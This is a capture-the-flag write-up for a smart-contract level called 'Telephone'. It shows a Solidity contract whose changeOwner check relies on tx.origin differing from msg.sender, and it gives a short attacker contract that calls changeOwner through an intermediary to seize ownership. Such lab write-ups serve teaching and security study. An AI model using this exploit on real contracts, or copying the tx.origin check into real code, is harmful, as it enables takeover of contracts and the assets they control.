# **Level 4 -- Telephone**
## **Contract to hack**
``` solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
---
## ***Objectives***
* Claim ownership of the contract
---
## ***Thought Process***
Except for the `constructor()` function, this contract only has one function `changeOwner()`, and there are only one condition `tx.origin != msg.sender` in the function. Therefore we just need to fulfill the condition`tx.origin != msg.sender` to claim the ownership of the contract.
This is a very easy challenge.

---
## ***Solution***
Create a contract to call `changeOwner()`
``` solidity
pragma solidity ^0.8.0;
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {
    address levelInstance;
    
    constructor(address _levelInstance) public {
      levelInstance = _levelInstance;
    }
  
  function claim() public {
    ITelephone(levelInstance).changeOwner(msg.sender);
  }

}
```



